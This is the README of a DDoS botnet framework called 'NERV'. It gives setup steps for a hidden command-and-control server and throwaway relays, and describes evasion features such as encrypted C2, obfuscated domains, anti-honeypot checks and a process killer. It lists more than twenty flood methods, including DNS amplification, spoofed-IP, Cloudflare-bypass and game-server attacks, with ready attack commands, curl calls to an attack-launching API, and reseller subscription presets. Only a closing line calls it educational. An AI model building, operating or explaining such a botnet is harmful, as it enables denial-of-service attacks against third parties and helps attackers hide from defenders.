# NERV Botnet

A modular, encrypted botnet framework with multi-relay support and 15 attack methods.

## Architecture

```
                     ┌─────────────────────────┐
                     │     CNC Server (hidden) │
                     │  Telnet: :6621          │
                     │  SSH:    :6622          │
                     │  API:    :30120         │
                     └──────────┬──────────────┘
                                │
                    ┌───────────┴───────────┐
                    │    Relay Server(s)    │
                    │  (throwaway VPSs)     │
                    │  SOCKS5 Proxy :1080   │
                    └───────────┬───────────┘
                                │
        ┌───────────────┬───────┴───────┬───────────────┐
        │               │               │               │
    ┌───┴───┐       ┌───┴───┐       ┌───┴───┐       ┌───┴───┐
    │ Bot 1 │       │ Bot 2 │       │ Bot 3 │       │ Bot 4 │
    └───────┘       └───────┘       └───────┘       └───────┘
```

### Security Features
- **Encrypted C2 traffic** - ChaCha20 encryption between bots and CNC
- **XOR-obfuscated domains** - All domains encrypted in binary (not visible in `strings`)
- **Multi-relay support** - Bots connect through SOCKS5 relays; CNC IP stays hidden
- **Domain fronting** - Optional ENS support via `.eth` domains
- **Anti-honeypot** - Suspicious IP detection, timing checks, single-instance enforcement

---

## Quick Start

### Prerequisites
- Linux (Ubuntu/Debian recommended)
- Go 1.21+
- GCC cross-compilers (auto-downloaded)
- Python 3 (for table generation)

### 1. Setup & Compile

```bash
# Clone the repository
git clone https://github.com/Sewer2K/NervNet.git
cd NervNet

# Make setup script executable
chmod +x setup.sh

# Option A: Direct connection (bots connect to CNC directly)
sudo ./setup.sh --domain yourdomain.com

# Option B: With ENS (.eth domains)
sudo ./setup.sh --domain yourethname.eth --ens

# Option C: With relay(s) (recommended for hiding CNC)
# Bots will have ALL relay domains encrypted in the binary
# They randomly pick one to connect to on each attempt
sudo ./setup.sh --domain yourdomain.com \
  --relay relay1.example.com 1080 \
  --relay relay2.example.com 1080

# Option D: With Discord bot (for monitoring via Discord)
# Get your bot token from https://discord.com/developers/applications
# Optionally pass a notification channel ID for attack alerts
sudo ./setup.sh --domain yourdomain.com \
  --discord "MTIzNDU2Nzg5MDEyMzQ1Njc4OQ.GxYzAb.TOKEN" \
  --discord-channel "123456789012345678"

# Option E: Everything combined (relays + Discord + ENS)
sudo ./setup.sh --domain yourdomain.com \
  --ens \
  --relay relay1.example.com 1080 \
  --relay relay2.example.com 1080 \
  --discord "MTIzNDU2Nzg5MDEyMzQ1Njc4OQ.GxYzAb.TOKEN" \
  --discord-channel "123456789012345678"

# You can specify up to 4 relays. The same relay binary runs on all VPSs:
# ./relay yourdomain.com 6621 1080
```

### 2. Start the CNC

```bash
# Navigate to the build directory
cd build_env/cnc

# Start the CNC server
sudo ./cnc
```

The CNC will output:
```
Created default user: 'admin:8350e5a3e24c153df2275c9f80692773'
Listening for Telnet connections port=6621
Listening for SSH connections port=6622
```

### 3. Start Relay(s) (if using relay mode)

The same relay binary works on any VPS - no recompilation needed. The relay connects to your CNC server.

```bash
# Copy the relay binary to your relay VPS
scp build_env/release/relay user@relay1-ip:~/
scp build_env/release/relay user@relay2-ip:~/

# On each relay VPS, run:
./relay yourdomain.com 6621 1080

# The relay will forward all bot traffic to your CNC
# Relays are throwaway - if one gets burned, just spin up a new VPS
```

> **Note:** The bots have ALL relay domains compiled into them. They randomly pick one at each connection. You can have 1-4 relays active simultaneously.

### 4. Connect to the CNC

```bash
# Via SSH (recommended)
ssh admin@<cnc-ip> -p 6622

# Via Telnet
telnet <cnc-ip> 6621
```

**Default credentials:** `admin` / `8350e5a3e24c153df2275c9f80692773`

---

## Attack Methods

### Layer 4
| Method | Description |
|--------|-------------|
| `udp` | UDP flood - high bandwidth |
| `udpplain` | UDP socket flood (no raw socket needed) |
| `udphex` | UDP flood with hex payload |
| `syn` | TCP SYN flood |
| `ack` | TCP ACK flood |
| `stomp` | TCP handshake + ACK/PSH flood |
| `tcpbypass` | TCP flood to bypass mitigation |
| `socket` | Standard TCP socket flood |
| `greip` | GRE IP encapsulation flood |
| `greeth` | GRE Ethernet encapsulation flood |
| `pps` | PPS (packets per second) raw flood |
| `dns` | DNS amplification attack |
| `esp` | ESP/IPSec flood |

### Layer 7
| Method | Description |
|--------|-------------|
| `http` | HTTP/1.1 GET flood |
| `tls` | TLS/SSL handshake flood |
| `tlsplus` | TLS+ bypass flood with cipher randomization |
| `cloudflare` | Cloudflare bypass with varied User-Agents |
| `nerv_l7` | NERV special - mixed GET/POST/WebSocket patterns |

### Games
| Method | Description |
|--------|-------------|
| `vse` | Valve Source Engine query flood |
| `raknet` | RakNet game server flood (Minecraft PE, GTA V, etc.) |
| `fivem` | FiveM game server connect flood |
| `discord` | Discord voice gateway flood |
| `ovh` | OVH UDP flood with spoofed IPs |

### Usage
```
<method> <target> <port> <duration> <len> [options]
```

The target can be an **IP address** or a **domain name** (DNS resolution is performed automatically by the CNC).

**Examples:**
```
# Layer 4
udp 1.1.1.1 80 60 1400
syn example.com 443 60 512
ack 192.168.1.1 80 60 1024
stomp 10.0.0.1 443 60 512
udpplain google.com 80 60 512
udphex 1.1.1.1 53 60 1024
tcpbypass example.com 443 60 512
socket 1.1.1.1 80 60 1024
greip 10.0.0.1 0 60 512
greeth 10.0.0.1 0 60 512
pps 1.1.1.1 0 60 1024
dns 1.1.1.1 53 60 512
esp 10.0.0.1 0 60 512

# Layer 7
http example.com 80 60 1024 path=/
http example.com 80 60 1024 path=/login useragent="Mozilla/5.0"
tls example.com 443 60 512
tlsplus example.com 443 60 512
cloudflare example.com 443 60 512
nerv_l7 example.com 80 60 1024 path=/index.html

# Games
vse example.com 27015 60 512
raknet 1.2.3.4 19132 60 24
fivem example.com 30120 60 512
discord 1.2.3.4 19309 60 512

# OVH
ovh example.com 80 60 512
ovh example.com 80 60 1024 pps=500
```

### Common Options
| Option | Description | Example |
|--------|-------------|---------|
| `len` | Payload size | `len=1024` |
| `dport` | Destination port | `dport=80` |
| `sport` | Source port | `sport=53` |
| `ttl` | IP Time To Live | `ttl=255` |
| `df` | Don't Fragment flag | `df=1` |
| `source` | Spoofed source IP | `source=1.1.1.1` |
| `path` | HTTP path | `path=/index.php` |
| `domain` | Custom domain for HTTP Host header | `domain=example.com` |
| `useragent` | Custom User-Agent | `useragent="Mozilla/5.0"` |
| `cookies` | HTTP cookies | `cookies="session=abc"` |
| `method` | HTTP method (GET/POST) | `method=POST` |

---

## CNC Commands

### General
| Command | Description |
|---------|-------------|
| `help` | Show detailed help from current theme |
| `?` or `methods` | Show all available attack methods |
| `clear` or `cls` | Clear the terminal |
| `count` | Show total bot count |
| `stats` | Show bot statistics (cores, RAM, architecture) |
| `passwd` | Change your password |

| `logout` / `exit` / `quit` | Disconnect |

### Admin Only
| Command | Description |
|---------|-------------|
| `users` | List all users |
| `users add <args>` | Create a new user |
| `users remove <username>` | Delete a user |
| `users edit <username> <field> <value>` | Modify user settings |
| `users timeout <username> <minutes>` | Temporarily block a user |
| `add <preset> <username> <password>` | Quick user creation from preset |
| `sessions` | Show active sessions |
| `sessions kick <username>` | Force disconnect a user |
| `ongoing` or `bcstats` | Show running attacks |
| `broadcast <message>` | Send message to all bots |
| `attacks enable` / `attacks disable` | Toggle attacks globally |
| `clogs` | Clear attack logs |

---

## Project Structure

```
nervnet/
├── bot/                        # Bot source (C)
│   ├── main.c                  # Bot entry point, CNC connection
│   ├── tcp.c                   # TCP connection handler
│   ├── attack.c                # Attack dispatcher
│   ├── attack.h                # Attack definitions & options
│   ├── attack_*.c              # Individual attack methods (20+)
│   ├── table.c / table.h       # XOR-obfuscated string storage
│   ├── chacha20.c / chacha20.h # ChaCha20 encryption
│   ├── resolv.c / resolv.h     # DNS resolver
│   ├── ens.c / ens.h           # ENS domain resolver
│   ├── killer.c / killer.h     # Process killer
│   ├── util.c / util.h         # Utility functions
│   ├── rand.c / rand.h         # Random number generation
│   ├── checksum.c / checksum.h # IP/TCP/UDP checksums
│   └── includes.h              # Shared definitions
├── cnc/                        # CNC server (Go)
│   ├── main.go                 # Entry point
│   ├── core/
│   │   ├── masters/            # CNC operator interface
│   │   ├── slaves/             # Bot connection handler
│   │   ├── attacks/            # Attack management
│   │   ├── database/           # SQLite user database
│   │   ├── api/                # HTTP API
│   │   ├── telegram/           # Telegram bot
│   │   ├── frontend/           # File servers (HTTP/FTP/TFTP)
│   │   ├── config/             # Configuration
│   │   └── utils/              # Utilities
│   └── assets/                 # Branding, themes, config
│       └── branding/
│           └── nerv/           # NERV theme (Evangelion)
├── relay/                      # SOCKS5 relay server (Go)
│   └── main.go                 # Relay entry point
├── setup.sh                    # Build & setup script
├── generate_table.py           # XOR-obfuscation generator
├── COMMANDS.md                 # Full command reference
└── README.md                   # This file
```

---

## Themes

The CNC supports customizable themes. Switch between them with `themes set <name>`.

The CNC uses the **NERV** theme exclusively - a purple/green Evangelion-inspired interface.
- Primary: Purple `#9B26B6`
- Secondary: Green `#00E676`
- Full NERV command interface aesthetic with ASCII art banners

---

## Security Architecture

```
┌──────────────────────────────────────────────────────────┐
│                    Binary Hardening                       │
├──────────────────────────────────────────────────────────┤
│ Domain Obfuscation   │ XOR-encrypted via table.c         │
│ Traffic Encryption    │ ChaCha20 after initial handshake  │
│ Anti-Honeypot        │ Suspicious IP detection           │
│ Anti-Debug           │ Process hiding, timing checks     │
│ Single Instance      │ Port-based lock                   │
└──────────────────────────────────────────────────────────┘
```

### Encryption Flow
1. Bot connects via SOCKS5 relay or direct TCP
2. ChaCha20 session key exchange (4-byte auth magic)
3. All subsequent traffic encrypted with ChaCha20
4. Domain names XOR-obfuscated in binary at rest

---

## HTTP API

The CNC includes a RESTful HTTP API that allows you to launch attacks, check bot statistics, and manage users programmatically. The API runs on port **64243** by default.

### Configuration

API settings are in `assets/config.json`:
```json
{
  "api": {
    "enabled": true,
    "host": "0.0.0.0",
    "port": 30120
  }
}
```

> **Note:** `config.json` has `api.host` and `api.port` fields, but the API server is hardcoded to listen on port **64243**. If you want to change it, edit the port in `core/api/api.go`.

### Authentication

All endpoints require HTTP Basic-style auth via query parameters:
- `username` – Your CNC username
- `password` – Your CNC password (plaintext)

### Endpoints

#### `GET /api/attack`
Launch an attack against a target.

**Parameters:**
| Parameter   | Required | Description |
|-------------|----------|-------------|
| `username`  | ✅ | CNC account username |
| `password`  | ✅ | CNC account password |
| `target`    | ✅ | Target IPv4 address |
| `port`      | ✅ | Target port (1–65535) |
| `duration`  | ✅ | Attack duration in seconds (1–999) |
| `method`    | ✅ | Attack method (see attack table above) |
| `size`      | ❌ | Packet size/payload length |
| `botcount`  | ❌ | Number of bots to use (-1 for all, or a specific number) |

**Response:**
```json
{
  "message": "Command sent to 150 clients"
}
```

**Example:**
```bash
curl "http://your-cnc-ip:64243/api/attack?username=admin&password=8350e5a3e24c153df2275c9f80692773&target=1.1.1.1&port=443&duration=60&method=udp&size=1400&botcount=50"
```

#### `GET /api/slaves`
Get bot distribution statistics grouped by architecture. This shows how many bots of each type are connected, plus the change since the last check.

**Parameters:**
| Parameter   | Required | Description |
|-------------|----------|-------------|
| `username`  | ✅ | CNC account username |
| `password`  | ✅ | CNC account password |

> **Note:** This endpoint currently restricts access to a user named `amplified`. You can change this in `core/api/endpoints/slaves.go`.

**Response:**
```json
{
  "arm7": {"value": 42, "change": 5},
  "mips": {"value": 18, "change": -2},
  "x86_64": {"value": 95, "change": 12}
}
```

**Example:**
```bash
curl "http://your-cnc-ip:64243/api/slaves?username=amplified&password=yourpassword"
```

#### `GET /api/adduser`
Admin-only endpoint to create new users from a preset.

**Parameters:**
| Parameter   | Required | Description |
|-------------|----------|-------------|
| `username`  | ✅ | Your CNC admin username |
| `password`  | ✅ | Your CNC admin password |
| `newuser`   | ✅ | Desired username for the new account |
| `newpass`   | ✅ | Desired password for the new account |
| `preset`    | ✅ | Preset name from `assets/presets.json` |

**Presets (defined in `assets/presets.json`):**
| Preset   | Duration | Cooldown | Max Attacks | Expiry  | Admin | Reseller |
|----------|----------|----------|-------------|---------|-------|----------|
| `day`    | 60s      | 100s     | 100         | 1 day   | No    | No       |
| `week`   | 60s      | 100s     | 100         | 7 days  | No    | No       |
| `month`  | 60s      | 100s     | 100         | 30 days | No    | No       |
| `seller` | 60s      | 100s     | 100         | 90 days | No    | Yes (VIP)|

**Response (success):**
```json
{
  "success": true,
  "message": "user created successfully"
}
```

**Example:**
```bash
curl "http://your-cnc-ip:64243/api/adduser?username=admin&password=8350e5a3e24c153df2275c9f80692773&newuser=client1&newpass=mypassword&preset=month"
```

---

## Telegram Bot

The CNC includes a Telegram bot for monitoring your botnet's status. It can provide real-time bot counts with delta tracking from anywhere on your phone.

### Setup

1. **Create a Telegram bot:**
   - Open Telegram and search for [@BotFather](https://t.me/BotFather)
   - Send `/newbot` and follow the prompts
   - Copy the API token you receive (looks like `123456789:ABCdefGHIjklmNOPqrSTUvwxYZ`)

2. **Get your Telegram user ID:**
   - Search for [@userinfobot](https://t.me/userinfobot) on Telegram
   - Send `/start` – it will reply with your numeric user ID (e.g., `123456789`)

3. **Edit `assets/config.json`:**
   ```json
   {
     "telegram": {
       "enabled": true,
       "botToken": "123456789:ABCdefGHIjklmNOPqrSTUvwxYZ",
       "ChatId": 123456789,
       "admins": ["123456789"]
     }
   }
   ```

   - `enabled` – Set to `true` to activate the Telegram bot
   - `botToken` – The API token from BotFather
   - `ChatId` – Your Telegram user ID (where notifications go)
   - `admins` – Array of Telegram user IDs allowed to use bot commands

4. **Rebuild and restart the CNC:**
   ```bash
   cd build_env/cnc
   go build -o cnc main.go
   sudo ./cnc
   ```

### Features

**Bot commands:**
| Command | Description |
|---------|-------------|
| `/ping` | Check if the bot is alive and measure response latency |
| `/bots` | Show bot distribution with real-time deltas (changes since last check) |

**Automatic attack notifications:**
Whenever an attack is launched via the CNC, a message is automatically sent to the configured `ChatId` with:
- Attack method
- Target host and port
- Duration
- Payload size
- Current bot count
- Timestamp
- User who launched the attack

### Security
- Commands are restricted to user IDs listed in `config.json` → `telegram` → `admins`
- The `admins` field accepts string representations of Telegram user IDs (e.g., `["123456789", "987654321"]`)

### Example `/bots` Output
```
arm7: 42 (+5)
mips: 18 (-2)
x86_64: 95 (+12)
Total: 155
```

The `(+5)` / `(-2)` shows the change in bot count since the last time `/bots` was called, making it easy to see if bots are connecting or dropping off.

---

## Discord Bot

The CNC also includes a Discord bot with the same monitoring capabilities as the Telegram bot, plus rich embed formatting for attack notifications.

### Setup

1. **Create a Discord bot:**
   - Go to the [Discord Developer Portal](https://discord.com/developers/applications)
   - Click **New Application** and give it a name
   - Go to the **Bot** tab on the left sidebar
   - Click **Add Bot** → **Yes, do it!**
   - Under the **TOKEN** section, click **Copy** – this is your bot token (keep it secret!)

2. **Invite the bot to your server:**
   - In the Developer Portal, go to **OAuth2** → **URL Generator**
   - Under **Scopes**, check `bot`
   - Under **Bot Permissions**, check:
     - `Send Messages`
     - `Embed Links`
     - `Read Message History`
   - Copy the generated URL, open it in a browser, and invite the bot to your server

3. **Get your Discord user ID and channel IDs:**
   - Enable **Developer Mode** in Discord: Settings → Advanced → Developer Mode
   - Right-click your username → **Copy ID** (this is your admin user ID)
   - Right-click a channel → **Copy ID** (this is a channel ID)
   - Right-click the channel where you want attack notifications → **Copy ID**

4. **Edit `assets/config.json`:**
   ```json
   {
     "discord": {
       "enabled": true,
       "botToken": "MTIzNDU2Nzg5MDEyMzQ1Njc4OQ.GxYzAb.TOKEN_HERE",
       "prefix": "!",
       "admins": ["123456789012345678"],
       "allowedChannels": ["123456789012345678"],
       "notificationChannel": "123456789012345678"
     }
   }
   ```

   | Field | Description |
   |-------|-------------|
   | `enabled` | Set to `true` to activate the Discord bot |
   | `botToken` | The bot token from the Developer Portal |
   | `prefix` | Command prefix (default: `!`) |
   | `admins` | Array of Discord user IDs allowed to use bot commands |
   | `allowedChannels` | Array of channel IDs the bot will respond in (leave empty for all channels) |
   | `notificationChannel` | Channel ID where attack notifications will be sent |

5. **Install the dependency and rebuild:**
   ```bash
   cd cnc
   go mod tidy
   go build -o cnc main.go
   sudo ./cnc
   ```

### Commands

| Command | Description |
|---------|-------------|
| `!ping` | Check if the bot is alive and measure response latency |
| `!bots` | Show bot distribution with real-time deltas, formatted as a rich embed |

> **Note:** The default prefix is `!`. You can change it to anything in `config.json` (e.g., `"prefix": "?"` means commands would be `?ping`, `?bots`).

### Features

- **Rich embed formatting** – Bot stats and attack notifications use Discord embeds with colors and structured fields
- **Channel permissions** – Restrict which channels the bot responds in via `allowedChannels`
- **Admin-only commands** – `/bots` only works for user IDs listed in `admins`
- **Automatic attack notifications** – Every attack launched via the CNC sends a rich embed to the `notificationChannel` with method, target, port, duration, size, bot count, and who started it

### Example `!bots` Output
A purple-colored embed showing:
```
📊 Bot Distribution
arm7: 42 (+5)   | mips: 18 (-2)   | x86_64: 95 (+12)
Total: 155
```

### Example Attack Notification
A green-colored embed showing:
```
🔥 Attack Launched
Method: udp   | Host: 1.1.1.1   | Port: 443
Duration: 60s | Size: 1400      | Bot Count: 150
Started By: admin
```

---

## License

This project is for educational purposes only.
